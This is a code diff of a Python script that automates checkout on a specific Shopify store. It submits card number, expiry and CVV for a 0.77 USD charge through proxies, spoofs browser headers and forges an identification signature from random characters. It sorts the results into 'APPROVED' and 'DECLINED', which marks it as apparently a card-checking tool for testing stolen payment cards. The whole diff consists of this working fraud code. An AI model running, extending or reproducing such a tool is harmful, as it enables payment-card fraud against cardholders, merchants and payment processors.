-                r'"shopifyPaymentRequestIdentificationSignature"\s*:\s*"(eyJ[^"]+)"',
-                r'(eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)',
-            ]
-            for pat in sig_patterns:
-                m = re.search(pat, html)
-                if m:
-                    self.signature = m.group(1)
-                    break
-            
-            if self.signature:
-                self.logger.data_extracted("PCI Signature", self.signature[:30] + "...", "Checkout HTML")
-            
-            # Extract queue token
-            q_patterns = [
-                r'"queueToken"\s*:\s*"([^"]+)"',
-            ]
-            for pat in q_patterns:
-                m = re.search(pat, html)
-                if m:
-                    self.queue_token = m.group(1)
-                    break
-            
-            if self.queue_token:
-                self.logger.data_extracted("Queue Token", self.queue_token[:30] + "...", "Checkout HTML")
-            
-            # Extract stable ID
-            s_patterns = [
-                r'"stableId"\s*:\s*"([^"]+)"',
-            ]
-            for pat in s_patterns:
-                m = re.search(pat, html)
-                if m:
-                    self.stable_id = m.group(1)
-                    break
-            
+                self.session_token = "AAEB_" + self.generate_random_string(50)
+                self.logger.data_extracted("Session Token", "GENERATED fallback", "Fallback")
             if not self.stable_id:
                 self.stable_id = self.generate_uuid()
             
-            self.logger.data_extracted("Stable ID", self.stable_id, "Checkout HTML")
-            
-            return True, html
-        except httpx.ProxyError:
-            self.proxy_status = "Dead 🚫"
-            return False, "PROXY_DEAD"
-        except httpx.TimeoutException:
-            return False, "TIMEOUT"
+            return True, "CHECKOUT_OK"
         except Exception as e:
-            return False, f"Checkout page error: {str(e)[:50]}"
+            return False, "Checkout page error: {}".format(str(e)[:50])
 
-    # ========== STEP 5: Submit Initial Proposal ==========
-    async def submit_initial_proposal(self):
-        self.step(5, "SUBMIT INITIAL PROPOSAL", f"Setting email: {self.email}")
-        
-        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
-        
-        graphql_headers = {
-            'authority': 'shopmiddleeastern.com',
-            'accept': 'application/json',
-            'accept-language': 'en-US',
-            'content-type': 'application/json',
-            'origin': self.base_url,
-            'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?_r={self.generate_random_string(20)}&auto_redirect=false&edge_redirect=true&skip_shop_pay=true',
-            'sec-ch-ua': self.sec_ch_ua,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'shopify-checkout-client': 'checkout-web/1.0',
-            'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
-            'user-agent': self.ua,
-            'x-checkout-one-session-token': self.session_token,
-            'x-checkout-web-build-id': 'd337b60249d314b13499c517706706e019af3129',
-            'x-checkout-web-deploy-stage': 'production',
-            'x-checkout-web-server-handling': 'fast',
-            'x-checkout-web-server-rendering': 'yes',
-            'x-checkout-web-source-id': self.checkout_token,
-        }
-        
-        variables = {
-            "sessionInput": {"sessionToken": self.graphql_session_token},
-            "queueToken": f"A{self.generate_random_string(43)}==",
-            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
-            "delivery": {
-                "deliveryLines": [{
-                    "destination": {
-                        "geolocation": {
-                            "coordinates": {"latitude": 28.6327, "longitude": 77.2198},
-                            "countryCode": "US"
-                        }
-                    },
-                    "selectedDeliveryStrategy": {
-                        "deliveryStrategyByHandle": {
-                            "handle": self.delivery_strategy_handle,
-                            "customDeliveryRate": False
-                        },
-                        "options": {}
-                    },
-                    "targetMerchandiseLines": {"lines": [{"stableId": self.stable_id}]},
-                    "deliveryMethodTypes": ["PICK_UP"],
-                    "expectedTotalPrice": {"value": {"amount": "0.00", "currencyCode": "USD"}},
-                    "destinationChanged": True
-                }],
-                "noDeliveryRequired": [],
-                "useProgressiveRates": False,
-                "prefetchShippingRatesStrategy": None,
-                "supportsSplitShipping": True
-            },
-            "deliveryExpectations": {"deliveryExpectationLines": []},
-            "merchandise": {
-                "merchandiseLines": [{
-                    "stableId": self.stable_id,
-                    "merchandise": {
-                        "productVariantReference": {
-                            "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
-                            "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
-                            "properties": [],
-                            "sellingPlanId": None,
-                            "sellingPlanDigest": None
-                        }
-                    },
-                    "quantity": {"items": {"value": 1}},
-                    "expectedTotalPrice": {"value": {"amount": "0.75", "currencyCode": "USD"}},
-                    "lineComponentsSource": None,
-                    "lineComponents": []
-                }]
-            },
-            "memberships": {"memberships": []},
-            "payment": {
-                "totalAmount": {"any": True},
-                "paymentLines": [],
-                "billingAddress": {
-                    "streetAddress": {
-                        "address1": "", "city": "", "countryCode": "US",
-                        "lastName": "", "phone": ""
-                    }
-                }
-            },
-            "buyerIdentity": {
-                "customer": {"presentmentCurrency": "USD", "countryCode": "US"},
-                "email": self.email,
-                "emailChanged": True,
-                "phoneCountryCode": "US",
-                "marketingConsent": [],
-                "shopPayOptInPhone": {"countryCode": "US"},
-                "rememberMe": False
-            },
-            "tip": {"tipLines": []},
-            "taxes": {
-                "proposedAllocations": None,
-                "proposedTotalAmount": {"value": {"amount": "0.02", "currencyCode": "USD"}},
-                "proposedTotalIncludedAmount": None,
-                "proposedMixedStateTotalAmount": None,
-                "proposedExemptions": []
-            },
-            "note": {"message": None, "customAttributes": []},
-            "localizationExtension": {"fields": []},
-            "nonNegotiableTerms": None,
-            "scriptFingerprint": {
-                "signature": None, "signatureUuid": None,
-                "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
-            },
-            "optionalDuties": {"buyerRefusesDuties": False},
-            "cartMetafields": [],
-            "includeTaxStrategyLines": False
-        }
-        
-        payload = {"operationName": "Proposal", "variables": variables, "id": self.proposal_id}
-        
-        try:
-            resp = await self.client.post(
-                graphql_url + "?operationName=Proposal",
-                headers=graphql_headers, json=payload, timeout=25
-            )
-            
-            if resp.status_code != 200:
-                return False, f"Proposal failed: {resp.status_code}"
-            
-            proposal_resp = resp.json()
-            
-            if 'errors' in proposal_resp and proposal_resp['errors']:
-                error_msgs = [e.get('code', 'UNKNOWN') for e in proposal_resp['errors']]
-                expected_codes = ['TAX_NEW_TAX_MUST_BE_ACCEPTED', 'PAYMENTS_FIRST_NAME_REQUIRED',
-                                 'PAYMENTS_LAST_NAME_REQUIRED', 'PAYMENTS_ADDRESS1_REQUIRED',
-                                 'PAYMENTS_ZONE_REQUIRED_FOR_COUNTRY', 'PAYMENTS_POSTAL_CODE_REQUIRED',
-                                 'PAYMENTS_CITY_REQUIRED', 'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT']
-                
-                if any(code in expected_codes for code in error_msgs):
-                    self.logger.data_extracted("Proposal", f"Expected: {', '.join(error_msgs)}", "Expected")
-                else:
-                    return False, f"DECLINED - {', '.join(error_msgs)}"
-            
-            # Extract queue token from response
-            data = proposal_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
-            new_queue_token = data.get('queueToken')
-            if new_queue_token:
-                self.queue_token = new_queue_token
-                self.logger.data_extracted("Queue Token", self.queue_token[:30] + "...", "Proposal response")
-            
-            return True, "PROPOSAL_SUCCESS"
-            
-        except httpx.ProxyError:
-            self.proxy_status = "Dead 🚫"
-            return False, "PROXY_DEAD"
-        except httpx.TimeoutException:
-            return False, "TIMEOUT"
-        except Exception as e:
-            return False, f"Proposal error: {str(e)[:50]}"
-
-    # ========== STEP 6: Create PCI Payment Session ==========
     async def create_payment_session(self, cc, mes, ano, cvv):
-        self.step(6, "CREATE PAYMENT SESSION", "Creating PCI payment session")
+        self.step(6, "CREATE PAYMENT", "Creating PCI payment session")
         
         pci_headers = {
             'authority': 'checkout.pci.shopifyinc.com',
@@ -1197,7 +980,7 @@ class ShopifyMiddleEasternCheckout:
             'accept-language': 'en-US,en;q=0.9',
             'content-type': 'application/json',
             'origin': 'https://checkout.pci.shopifyinc.com',
-            'referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=',
+            'referer': f'https://checkout.pci.shopifyinc.com/build/{self.pci_build_hash}/number-ltr.html?identifier=&locationURL=',
             'sec-ch-ua': self.sec_ch_ua,
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
@@ -1214,8 +997,8 @@ class ShopifyMiddleEasternCheckout:
             header = base64.urlsafe_b64encode(json.dumps({"kid": "v1", "alg": "HS256"}).encode()).decode().rstrip('=')
             payload_data = {"client_id": "2", "client_account_id": self.shop_id, "unique_id": self.checkout_token, "iat": int(time.time())}
             payload_b64 = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).decode().rstrip('=')
-            signature = self.generate_random_string(43)
-            pci_headers['shopify-identification-signature'] = f"{header}.{payload_b64}.{signature}"
+            sig = self.generate_random_string(43)
+            pci_headers['shopify-identification-signature'] = f"{header}.{payload_b64}.{sig}"
         
         card_number = cc.replace(" ", "").replace("-", "")
         year_full = ano if len(ano) == 4 else f"20{ano}"
@@ -1236,35 +1019,33 @@ class ShopifyMiddleEasternCheckout:
         }
         
         try:
-            resp = await self.client.post(
+            self.pci_client = httpx.AsyncClient(proxy=self.proxy_url, timeout=30)
+            resp = await self.pci_client.post(
                 'https://checkout.pci.shopifyinc.com/sessions',
-                headers=pci_headers, json=pci_payload, timeout=25
+                headers=pci_headers, json=pci_payload, timeout=30
             )
             
-            if resp.status_code != 200:
-                return False, f"PCI session failed: {resp.status_code}"
+            if resp.status_code not in [200, 201]:
+                return False, "PCI failed: {}".format(resp.status_code)
             
             pci_resp = resp.json()
-            payment_session_id = pci_resp.get('id')
-            if not payment_session_id:
-                return False, "No payment session ID"
+            session_id = pci_resp.get('id')
+            if not session_id:
+                return False, "No session ID"
             
-            self.logger.data_extracted("Payment Session ID", payment_session_id, "PCI")
-            return True, payment_session_id
-            
+            self.logger.data_extracted("Payment Session", session_id[:20] + "...", "PCI")
+            return True, session_id
         except httpx.ProxyError:
             self.proxy_status = "Dead 🚫"
             return False, "PROXY_DEAD"
-        except httpx.TimeoutException:
-            return False, "TIMEOUT"
         except Exception as e:
-            return False, "PCI_ERROR"
+            return False, "PCI_ERROR: {}".format(str(e)[:30])
 
-    # ========== STEP 7: Submit Billing Proposal ==========
-    async def submit_billing_proposal(self, cc, payment_session_id):
-        self.step(7, "SUBMIT BILLING PROPOSAL", f"Setting billing: {self.address['address1']}")
+    async def submit_for_completion(self, payment_session_id, cc):
+        self.step(7, "SUBMIT PAYMENT", "Finalizing payment")
         
-        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
+        # Use /checkouts/unstable/graphql like the working shopify054
+        graphql_url = f"{self.base_url}/checkouts/unstable/graphql"
         
         graphql_headers = {
             'authority': 'shopmiddleeastern.com',
@@ -1272,7 +1053,7 @@ class ShopifyMiddleEasternCheckout:
             'accept-language': 'en-US',
             'content-type': 'application/json',
             'origin': self.base_url,
-            'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?_r={self.generate_random_string(20)}&auto_redirect=false&edge_redirect=true&skip_shop_pay=true',
+            'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us',
             'sec-ch-ua': self.sec_ch_ua,
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
@@ -1283,207 +1064,66 @@ class ShopifyMiddleEasternCheckout:
             'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
             'user-agent': self.ua,
             'x-checkout-one-session-token': self.session_token,
-            'x-checkout-web-build-id': 'd337b60249d314b13499c517706706e019af3129',
             'x-checkout-web-deploy-stage': 'production',
             'x-checkout-web-server-handling': 'fast',
             'x-checkout-web-server-rendering': 'yes',
             'x-checkout-web-source-id': self.checkout_token,
         }
         
-        card_number = cc.replace(" ", "").replace("-", "")
-        card_bin = card_number[:8]
+        attempt_token = f"{self.checkout_token}-{self.generate_random_string(8)}"
+        card_clean = cc.replace(" ", "").replace("-", "")
+        credit_card_bin = card_clean[:8] if len(card_clean) >= 8 else card_clean[:6]
         
-        variables = {
-            "sessionInput": {"sessionToken": self.graphql_session_token},
-            "queueToken": self.queue_token,
-            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
-            "delivery": {
-                "deliveryLines": [{
-                    "destination": {
-                        "geolocation": {
-                            "coordinates": {"latitude": 28.6327, "longitude": 77.2198},
-                            "countryCode": "US"
-                        }
-                    },
-                    "selectedDeliveryStrategy": {
-                        "deliveryStrategyByHandle": {
-                            "handle": self.delivery_strategy_handle,
-                            "customDeliveryRate": False
-                        },
-                        "options": {}
-                    },
-                    "targetMerchandiseLines": {"lines": [{"stableId": self.stable_id}]},
-                    "deliveryMethodTypes": ["PICK_UP"],
-                    "expectedTotalPrice": {"value": {"amount": "0.00", "currencyCode": "USD"}},
-                    "destinationChanged": True
-                }],
-                "noDeliveryRequired": [],
-                "useProgressiveRates": False,
-                "prefetchShippingRatesStrategy": None,
-                "supportsSplitShipping": True
-            },
-            "deliveryExpectations": {"deliveryExpectationLines": []},
-            "merchandise": {
-                "merchandiseLines": [{
-                    "stableId": self.stable_id,
-                    "merchandise": {
-                        "productVariantReference": {
-                            "id": f"gid://shopify/ProductVariantMerchandise/{self.variant_id}",
-                            "variantId": f"gid://shopify/ProductVariant/{self.variant_id}",
-                            "properties": [],
-                            "sellingPlanId": None,
-                            "sellingPlanDigest": None
-                        }
-                    },
-                    "quantity": {"items": {"value": 1}},
-                    "expectedTotalPrice": {"value": {"amount": "0.75", "currencyCode": "USD"}},
-                    "lineComponentsSource": None,
-                    "lineComponents": []
-                }]
-            },
-            "memberships": {"memberships": []},
-            "payment": {
-                "totalAmount": {"any": True},
-                "paymentLines": [],
-                "billingAddress": {
-                    "streetAddress": {
-                        "address1": self.address["address1"],
-                        "address2": self.address["address2"],
-                        "city": self.address["city"],
-                        "countryCode": self.address["countryCode"],
-                        "postalCode": self.address["zip"],
-                        "firstName": self.first_name,
-                        "lastName": self.last_name,
-                        "zoneCode": self.address["provinceCode"],
-                        "phone": ""
-                    }
+        # Build delivery expectation lines from signed handles
+        delivery_expectation_lines = []
+        if self.signed_handles:
+            delivery_expectation_lines = [{"signedHandle": sh} for sh in self.signed_handles]
+        
+        # Build delivery strategy
+        if self.delivery_strategy_handle:
+            delivery_strategy = {
+                "deliveryStrategyByHandle": {
+                    "handle": self.delivery_strategy_handle,
+                    "customDeliveryRate": False
                 },
-                "creditCardBin": card_bin
-            },
-            "buyerIdentity": {
-                "customer": {"presentmentCurrency": "USD", "countryCode": "US"},
-                "email": self.email,
-                "emailChanged": False,
-                "phoneCountryCode": "US",
-                "marketingConsent": [{"email": {"consentState": "DECLINED", "value": self.email}}],
-                "shopPayOptInPhone": {"countryCode": "US"},
-                "rememberMe": False
-            },
-            "tip": {"tipLines": []},
-            "taxes": {
-                "proposedAllocations": None,
-                "proposedTotalAmount": {"value": {"amount": "0.02", "currencyCode": "USD"}},
-                "proposedTotalIncludedAmount": None,
-                "proposedMixedStateTotalAmount": None,
-                "proposedExemptions": []
-            },
-            "note": {"message": None, "customAttributes": []},
-            "localizationExtension": {"fields": []},
-            "nonNegotiableTerms": None,
-            "scriptFingerprint": {
-                "signature": None, "signatureUuid": None,
-                "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
-            },
-            "optionalDuties": {"buyerRefusesDuties": False},
-            "cartMetafields": [],
-            "includeTaxStrategyLines": False
-        }
-        
-        payload = {"operationName": "Proposal", "variables": variables, "id": self.proposal_id}
-        
-        try:
-            resp = await self.client.post(
-                graphql_url + "?operationName=Proposal",
-                headers=graphql_headers, json=payload, timeout=25
-            )
-            
-            if resp.status_code != 200:
-                return False, f"Billing proposal failed: {resp.status_code}"
-            
-            billing_resp = resp.json()
-            
-            if 'errors' in billing_resp and billing_resp['errors']:
-                error_msgs = [e.get('code', 'UNKNOWN') for e in billing_resp['errors']]
-                if 'PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT' in error_msgs:
-                    # Expected sometimes, continue
-                    self.logger.data_extracted("Billing Proposal", f"Expected: {', '.join(error_msgs)}", "Expected")
-                else:
-                    return False, f"DECLINED - {', '.join(error_msgs)}"
-            
-            data = billing_resp.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
-            new_queue_token = data.get('queueToken')
-            if new_queue_token:
-                self.queue_token = new_queue_token
-                self.logger.data_extracted("Queue Token", self.queue_token[:30] + "...", "Billing proposal")
-            
-            return True, "BILLING_PROPOSAL_SUCCESS"
-            
-        except httpx.ProxyError:
-            self.proxy_status = "Dead 🚫"
-            return False, "PROXY_DEAD"
-        except httpx.TimeoutException:
-            return False, "TIMEOUT"
-        except Exception as e:
-            return False, f"Billing proposal error: {str(e)[:50]}"
-
-    # ========== STEP 8: Submit For Completion ==========
-    async def submit_for_completion(self, cc, payment_session_id):
-        self.step(8, "SUBMIT PAYMENT", "Finalizing payment of 0.77$")
-        
-        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
-        
-        graphql_headers = {
-            'authority': 'shopmiddleeastern.com',
-            'accept': 'application/json',
-            'accept-language': 'en-US',
-            'content-type': 'application/json',
-            'origin': self.base_url,
-            'referer': f'{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?_r={self.generate_random_string(20)}&auto_redirect=false&edge_redirect=true&skip_shop_pay=true',
-            'sec-ch-ua': self.sec_ch_ua,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'shopify-checkout-client': 'checkout-web/1.0',
-            'shopify-checkout-source': f'id="{self.checkout_token}", type="cn"',
-            'user-agent': self.ua,
-            'x-checkout-one-session-token': self.session_token,
-            'x-checkout-web-build-id': 'd337b60249d314b13499c517706706e019af3129',
-            'x-checkout-web-deploy-stage': 'production',
-            'x-checkout-web-server-handling': 'fast',
-            'x-checkout-web-server-rendering': 'yes',
-            'x-checkout-web-source-id': self.checkout_token,
-        }
-        
-        card_number = cc.replace(" ", "").replace("-", "")
-        card_bin = card_number[:8]
-        
-        attempt_token = f"{self.checkout_token}-{self.generate_random_string(10)}"
+                "options": {}
+            }
+        else:
+            delivery_strategy = {
+                "deliveryStrategyMatchingConditions": {
+                    "estimatedTimeInTransit": {"any": True},
+                    "shipments": {"any": True}
+                },
+                "options": {}
+            }
         
         variables = {
             "input": {
-                "sessionInput": {"sessionToken": self.graphql_session_token},
+                "checkpointData": None,
+                "sessionInput": {
+                    "sessionToken": self.session_token
+                },
                 "queueToken": self.queue_token,
-                "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
+                "discounts": {
+                    "lines": [],
+                    "acceptUnexpectedDiscounts": True
+                },
                 "delivery": {
                     "deliveryLines": [{
                         "destination": {
                             "geolocation": {
-                                "coordinates": {"latitude": 28.6327, "longitude": 77.2198},
+                                "coordinates": self.coordinates,
                                 "countryCode": "US"
                             }
                         },
-                        "selectedDeliveryStrategy": {
-                            "deliveryStrategyByHandle": {
-                                "handle": self.delivery_strategy_handle,
-                                "customDeliveryRate": False
-                            },
-                            "options": {}
+                        "selectedDeliveryStrategy": delivery_strategy,
+                        "targetMerchandiseLines": {
+                            "lines": [{"stableId": self.stable_id}]
                         },
-                        "targetMerchandiseLines": {"lines": [{"stableId": self.stable_id}]},
                         "deliveryMethodTypes": ["PICK_UP"],
-                        "expectedTotalPrice": {"value": {"amount": "0.00", "currencyCode": "USD"}},
+                        "expectedTotalPrice": {
+                            "value": {"amount": "0.00", "currencyCode": "USD"}
+                        },
                         "destinationChanged": True
                     }],
                     "noDeliveryRequired": [],
@@ -1491,7 +1131,9 @@ class ShopifyMiddleEasternCheckout:
                     "prefetchShippingRatesStrategy": None,
                     "supportsSplitShipping": True
                 },
-                "deliveryExpectations": {"deliveryExpectationLines": []},
+                "deliveryExpectations": {
+                    "deliveryExpectationLines": delivery_expectation_lines
+                },
                 "merchandise": {
                     "merchandiseLines": [{
                         "stableId": self.stable_id,
@@ -1505,7 +1147,9 @@ class ShopifyMiddleEasternCheckout:
                             }
                         },
                         "quantity": {"items": {"value": 1}},
-                        "expectedTotalPrice": {"value": {"amount": "0.75", "currencyCode": "USD"}},
+                        "expectedTotalPrice": {
+                            "value": {"amount": "0.75", "currencyCode": "USD"}
+                        },
                         "lineComponentsSource": None,
                         "lineComponents": []
                     }]
@@ -1516,7 +1160,7 @@ class ShopifyMiddleEasternCheckout:
                     "paymentLines": [{
                         "paymentMethod": {
                             "directPaymentMethod": {
-                                "paymentMethodIdentifier": self.payment_method_identifier,
+                                "paymentMethodIdentifier": self.payment_method_identifier or payment_session_id,
                                 "sessionId": payment_session_id,
                                 "billingAddress": {
                                     "streetAddress": {
@@ -1525,6 +1169,7 @@ class ShopifyMiddleEasternCheckout:
                                         "city": self.address["city"],
                                         "countryCode": self.address["countryCode"],
                                         "postalCode": self.address["zip"],
+                                        "company": "",
                                         "firstName": self.first_name,
                                         "lastName": self.last_name,
                                         "zoneCode": self.address["provinceCode"],
@@ -1549,7 +1194,12 @@ class ShopifyMiddleEasternCheckout:
                             "paypalBillingAgreementPaymentMethod": None,
                             "remotePaymentInstrument": None
                         },
-                        "amount": {"value": {"amount": "0.77", "currencyCode": "USD"}}
+                        "amount": {
+                            "value": {
+                                "amount": "0.77",
+                                "currencyCode": "USD"
+                            }
+                        }
                     }],
                     "billingAddress": {
                         "streetAddress": {
@@ -1558,22 +1208,29 @@ class ShopifyMiddleEasternCheckout:
                             "city": self.address["city"],
                             "countryCode": self.address["countryCode"],
                             "postalCode": self.address["zip"],
+                            "company": "",
                             "firstName": self.first_name,
                             "lastName": self.last_name,
                             "zoneCode": self.address["provinceCode"],
                             "phone": ""
                         }
                     },
-                    "creditCardBin": card_bin
+                    "creditCardBin": credit_card_bin
                 },
                 "buyerIdentity": {
-                    "customer": {"presentmentCurrency": "USD", "countryCode": "US"},
+                    "customer": {
+                        "presentmentCurrency": "USD",
+                        "countryCode": "US"
+                    },
                     "email": self.email,
                     "emailChanged": False,
                     "phoneCountryCode": "US",
-                    "marketingConsent": [{"email": {"consentState": "DECLINED", "value": self.email}}],
+                    "marketingConsent": [
+                        {"email": {"consentState": "GRANTED", "value": self.email}}
+                    ],
                     "shopPayOptInPhone": {"countryCode": "US"},
-                    "rememberMe": False
+                    "rememberMe": False,
+                    "setShippingAddressAsDefault": False
                 },
                 "tip": {"tipLines": []},
                 "taxes": {
@@ -1583,182 +1240,242 @@ class ShopifyMiddleEasternCheckout:
                     "proposedMixedStateTotalAmount": None,
                     "proposedExemptions": []
                 },
-                "note": {"message": None, "customAttributes": []},
+                "note": {
+                    "message": None,
+                    "customAttributes": []
+                },
                 "localizationExtension": {"fields": []},
+                "shopPayArtifact": {
+                    "optIn": {
+                        "vaultEmail": "",
+                        "vaultPhone": "",
+                        "optInSource": "REMEMBER_ME"
+                    }
+                },
                 "nonNegotiableTerms": None,
                 "scriptFingerprint": {
-                    "signature": None, "signatureUuid": None,
-                    "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
+                    "signature": None,
+                    "signatureUuid": None,
+                    "lineItemScriptChanges": [],
+                    "paymentScriptChanges": [],
+                    "shippingScriptChanges": []
                 },
                 "optionalDuties": {"buyerRefusesDuties": False},
+                "captcha": None,
                 "cartMetafields": []
             },
             "attemptToken": attempt_token,
             "metafields": [],
             "analytics": {
-                "requestUrl": f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?_r={self.generate_random_string(20)}&auto_redirect=false&edge_redirect=true&skip_shop_pay=true",
+                "requestUrl": f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us",
                 "pageId": self.generate_uuid().upper()
             }
         }
         
-        payload = {"operationName": "SubmitForCompletion", "variables": variables, "id": self.submit_id}
+        # Full mutation query (matching shopify054 pattern)
+        mutation = 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}...on PendingTermViolation{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}'
         
-        try:
-            resp = await self.client.post(
-                graphql_url + "?operationName=SubmitForCompletion",
-                headers=graphql_headers, json=payload, timeout=30
-            )
-            
-            if resp.status_code != 200:
-                return False, f"Submit failed: {resp.status_code}"
-            
-            submit_resp = resp.json()
-            
-            # Check for GraphQL errors
-            if 'errors' in submit_resp and submit_resp['errors']:
-                error_msgs = [e.get('code', 'UNKNOWN') for e in submit_resp['errors']]
-                return False, f"DECLINED - {', '.join(error_msgs)}"
-            
-            data = submit_resp.get('data', {}).get('submitForCompletion', {})
-            
-            # Check submit typename
-            submit_typename = data.get('__typename', '')
-            if submit_typename == 'SubmitFailed':
-                return False, f"DECLINED - {data.get('reason', 'SUBMIT_FAILED')}"
-            elif submit_typename == 'SubmitRejected':
-                errors = data.get('errors', [])
-                error_codes = [e.get('code', 'UNKNOWN') for e in errors]
-                return False, f"DECLINED - {', '.join(error_codes)}"
-            
-            receipt = data.get('receipt', {})
-            self.receipt_id = receipt.get('id')
-            
-            if not self.receipt_id:
-                return False, "DECLINED - No receipt ID"
-            
-            self.logger.data_extracted("Receipt ID", self.receipt_id.split('/')[-1], "Submit")
-            
-            receipt_type = receipt.get('__typename', '')
-            
-            if receipt_type == 'ProcessingReceipt':
-                poll_delay = receipt.get('pollDelay', 500) / 1000
-                self.logger.step(8, "POLL RECEIPT", f"Waiting {poll_delay}s", f"Delay: {poll_delay}s", "WAIT")
-                await asyncio.sleep(poll_delay)
-                return await self.poll_receipt(graphql_headers)
-                
-            elif receipt_type == 'ProcessedReceipt':
-                # Order already processed
-                order_identity = receipt.get('orderIdentity', {})
-                order_id = order_identity.get('id', 'N/A')
-                self.logger.success_log("Payment processed", f"Order: {order_id}")
-                return True, "ORDER_PLACED"
-                
-            elif receipt_type == 'FailedReceipt':
-                error_info = receipt.get('processingError', {})
-                error_code = error_info.get('code', 'GENERIC_ERROR')
-                error_msg = error_info.get('messageUntranslated', '')
-                if error_msg:
-                    return False, f"DECLINED - {error_code}: {error_msg[:50]}"
-                return False, f"DECLINED - {error_code}"
-                
-            elif receipt_type == 'ActionRequiredReceipt':
-                return True, "APPROVED - 3DS_REQUIRED"
-                
-            else:
-                return False, f"Unknown receipt: {receipt_type}"
-                
-        except httpx.ProxyError:
-            self.proxy_status = "Dead 🚫"
-            return False, "PROXY_DEAD"
-        except httpx.TimeoutException:
-            return False, "TIMEOUT"
-        except Exception as e:
-            return False, f"Submit error: {str(e)[:50]}"
-
-    # ========== STEP 9: Poll For Receipt ==========
-    async def poll_receipt(self, headers, max_polls=5):
-        self.step(9, "POLL RECEIPT", "Polling for payment status")
+        payload = {
+            "query": mutation,
+            "operationName": "SubmitForCompletion",
+            "variables": variables
+        }
         
-        graphql_url = f"{self.base_url}/checkouts/internal/graphql/persisted"
-        poll_attempts = 0
-        max_attempts = max_polls
+        max_retries = 12
         
-        while poll_attempts < max_attempts:
-            poll_attempts += 1
-            
+        for attempt_num in range(max_retries):
             try:
-                poll_variables = {
-                    "receiptId": self.receipt_id,
-                    "sessionToken": self.graphql_session_token
-                }
-                
-                poll_payload = {
-                    "operationName": "PollForReceipt",
-                    "variables": poll_variables,
-                    "id": self.poll_id
-                }
-                
                 resp = await self.client.post(
-                    graphql_url + "?operationName=PollForReceipt",
-                    headers=headers, json=poll_payload, timeout=25
+                    graphql_url,
+                    headers=graphql_headers,
+                    json=payload,
+                    timeout=30
                 )
                 
                 if resp.status_code != 200:
-                    if poll_attempts < max_attempts:
-                        await asyncio.sleep(1.0 * poll_attempts)
+                    if attempt_num < max_retries - 1:
+                        await asyncio.sleep(0.5)
                         continue
-                    return False, f"Poll failed: {resp.status_code}"
+                    return False, "Submit failed: {}".format(resp.status_code)
                 
-                poll_resp = resp.json()
-                receipt_data = poll_resp.get('data', {}).get('receipt', {})
-                receipt_type = receipt_data.get('__typename', '')
-                
-                if receipt_type == 'FailedReceipt':
-                    error_info = receipt_data.get('processingError', {})
-                    error_code = error_info.get('code', 'GENERIC_ERROR')
-                    # Return the REAL error from Stripe/Shopify
-                    return False, f"DECLINED - {error_code}"
-                    
-                elif receipt_type == 'ProcessedReceipt':
-                    self.logger.success_log("Payment processed successfully")
-                    return True, "ORDER_PLACED"
-                    
-                elif receipt_type == 'ProcessingReceipt':
-                    if poll_attempts < max_attempts:
-                        poll_delay = receipt_data.get('pollDelay', 500) / 1000
-                        wait_time = max(poll_delay, 1.0)
-                        self.logger.step(9, "POLL RECEIPT", f"Still processing {poll_attempts}/{max_attempts}", f"Waiting {wait_time:.1f}s", "WAIT")
-                        await asyncio.sleep(wait_time)
+                try:
+                    res = resp.json()
+                except:
+                    if attempt_num < max_retries - 1:
+                        await asyncio.sleep(0.5)
                         continue
+                    return False, "Failed to parse submit response"
+                
+                if 'errors' in res and res.get('data') is None:
